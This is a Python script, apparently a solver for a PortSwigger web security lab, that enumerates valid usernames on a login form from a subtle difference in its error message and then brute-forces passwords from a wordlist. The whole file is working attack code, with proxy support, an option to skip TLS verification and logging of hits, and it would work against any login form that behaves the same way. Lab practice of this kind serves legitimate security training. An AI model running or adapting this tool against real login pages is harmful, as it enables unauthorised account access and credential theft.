#!/usr/bin/env python3
"""
Username enumeration via subtly different responses (PortSwigger lab solver).

Pattern (the "subtle difference"):
  invalid username -> body contains "Invalid username or password."  (WITH trailing dot)
  valid username   -> body contains "Invalid username or password"   (NO trailing dot)

No hardcoded usernames or passwords: wordlists come from files
(default usernames.txt / passwords.txt).

Logic:
  PHASE 1 - username
    baseline = 1 request with a random invalid username.
    valid username <=> response does NOT match --invalid-regex.
                     (default regex: "invalid username or password\\.")

  PHASE 2 - password
    success <=> HTTP 301/302/303/307/308.

Usage:
  python3 Username-enumeration-via-subtly-different-responses.py \
      --url https://<id>.web-security-academy.net/login \
      --cookie "session=..." \
      --usernames usernames.txt --passwords passwords.txt

  ... --verbose
  ... --csv attempts.csv
  ... --phase usernames
  ... --phase passwords --username <found-user>
  ... --invalid-regex "invalid username or password\\."
  ... --proxy http://127.0.0.1:8080
"""
from __future__ import annotations

import argparse
import csv
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
    from requests import RequestException
except ImportError:
    print('error: pip3 install requests', file=sys.stderr)
    sys.exit(2)


def load_list(path: Path) -> list[str]:
    out, seen = [], set()
    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
        s = line.strip()
        if s and s not in seen:
            seen.add(s)
            out.append(s)
    return out


def norm(t: str) -> str:
    return re.sub(r'\s+', ' ', t or '').strip().lower()


def main() -> int:
    ap = argparse.ArgumentParser(
        description='Username enumeration via subtly different responses.')
    ap.add_argument('--url', required=True)
    ap.add_argument('--cookie', default='')
    ap.add_argument('--usernames', default='usernames.txt')
    ap.add_argument('--passwords', default='passwords.txt')
    ap.add_argument('--user-field', default='username')
    ap.add_argument('--pass-field', default='password')
    ap.add_argument('--static-password', default='test')
    ap.add_argument('--user-agent', default='Mozilla/5.0 (UsernameEnumeration)')
    ap.add_argument('--proxy', default='')
    ap.add_argument('--delay', type=float, default=0.0)
    ap.add_argument('--timeout', type=float, default=20.0)
    ap.add_argument('--insecure', action='store_true')
    ap.add_argument('--all', action='store_true')
    ap.add_argument('--verbose', action='store_true')
    ap.add_argument('--csv', default='')
    ap.add_argument('--invalid-regex', default=r'invalid username or password\.',
                    help='regex marking an INVALID username (trailing dot matters). '
                         'A response NOT matching this = valid username.')
    ap.add_argument('--phase', choices=['usernames', 'passwords', 'both'], default='both')
    ap.add_argument('--username', default='')
    args = ap.parse_args()

    usernames = load_list(Path(args.usernames))
    passwords = load_list(Path(args.passwords))
    if not usernames or not passwords:
        print('error: username/password wordlist is empty', file=sys.stderr)
        return 2

    s = requests.Session()
    s.headers.update({
        'User-Agent': args.user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
    })
    if args.cookie:
        s.headers['Cookie'] = args.cookie

    p = urlparse(args.url)
    vhost = f'{p.scheme}://{p.netloc}'
    s.headers['Origin'] = vhost
    s.headers['Referer'] = vhost + '/login'

    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    verify = not args.insecure
    invalid_re = re.compile(args.invalid_regex, re.I)

    rows: list[tuple[str, str, str, int, int, str, str]] = []

    def attempt(phase: str, user: str, pwd: str):
        try:
            r = s.post(args.url,
                       data={args.user_field: user, args.pass_field: pwd},
                       timeout=args.timeout, allow_redirects=False,
                       proxies=proxies, verify=verify)
        except RequestException as e:
            print(f'[!] error {phase} {user}:{pwd} -> {e}', file=sys.stderr)
            time.sleep(1)
            return None
        body = r.text or ''
        loc = r.headers.get('Location', '')
        m = bool(invalid_re.search(norm(body)))
        rows.append((phase, user, pwd, r.status_code, len(body), loc,
                     'invalid' if m else 'no-dot'))
        if args.verbose:
            print(f'    {phase:8s} {user}:{pwd:<12s} status={r.status_code} '
                  f'len={len(body)} invalid_match={m} {loc}', file=sys.stderr)
        if args.delay:
            time.sleep(args.delay)
        return r

    # ---------- baseline: random invalid username ----------
    r0 = attempt('baseline', 'zz-not-a-real-user-zz', args.static_password)
    if r0 is None:
        print('[-] baseline failed (check URL/connectivity)', file=sys.stderr)
        return 2
    b = norm(r0.text or '')
    print(f'[*] baseline invalid -> len={len(r0.text or "")} status={r0.status_code} '
          f'invalid_match={bool(invalid_re.search(b))}', file=sys.stderr)
    if not invalid_re.search(b):
        print('[!] baseline does not match --invalid-regex; check the lab error text.',
              file=sys.stderr)

    # ---------- PHASE 1: usernames ----------
    valid: list[str] = []
    if args.phase in ('usernames', 'both') and not args.username:
        print(f'[*] PHASE 1: {len(usernames)} username (static pw="{args.static_password}")',
              file=sys.stderr)
        for i, u in enumerate(usernames, 1):
            r = attempt('user', u, args.static_password)
            if r is None:
                continue
            if not invalid_re.search(norm(r.text or '')):
                print(f'[+] VALID USERNAME: {u} (len={len(r.text or "")} '
                      f'status={r.status_code})', file=sys.stderr)
                valid.append(u)
                if not args.all:
                    break
            elif i % 25 == 0:
                print(f'[*] {i}/{len(usernames)}', file=sys.stderr)

    if args.phase == 'usernames':
        print('\nVALID USERNAMES: ' + (', '.join(valid) if valid else 'none'))
        if args.csv:
            with open(args.csv, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f)
                w.writerow(('phase', 'user', 'pass', 'status', 'len', 'location', 'note'))
                w.writerows(rows)
            print(f'[*] CSV: {args.csv}', file=sys.stderr)
        return 0 if valid else 1

    # ---------- PHASE 2: passwords ----------
    targets = [args.username] if args.username else valid
    if not targets:
        print('[-] no valid username; skipping phase 2', file=sys.stderr)
        return 1

    print(f'[*] PHASE 2: {len(passwords)} password for {targets}', file=sys.stderr)
    hits: list[tuple[str, str, int, str]] = []
    for u in targets:
        for i, pw in enumerate(passwords, 1):
            r = attempt('pass', u, pw)
            if r is None:
                continue
            status = r.status_code
            length = len(r.text or '')
            loc = r.headers.get('Location', '')

            if status in (301, 302, 303, 307, 308):
                ok, why = True, 'redirect'
            else:
                # 200 = failed login. Do NOT use length-diff (false positives).
                ok, why = False, f'no-redirect (len={length}, status={status})'

            if ok:
                print(f'[+] HIT {u}:{pw} status={status} len={length} {loc} ({why})',
                      file=sys.stderr)
                hits.append((u, pw, status, loc))
                if not args.all:
                    break
            elif i % 25 == 0:
                print(f'[*] {u}: {i}/{len(passwords)}', file=sys.stderr)
        if hits and not args.all:
            break

    if args.csv:
        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            w.writerow(('phase', 'user', 'pass', 'status', 'len', 'location', 'note'))
            w.writerows(rows)
        print(f'[*] CSV: {args.csv}', file=sys.stderr)

    if hits:
        for u, pw, st, loc in hits:
            print(f'HIT {u}:{pw} ({st})')
        return 0
    print('[-] password not found', file=sys.stderr)
    return 1


if __name__ == '__main__':
    sys.exit(main())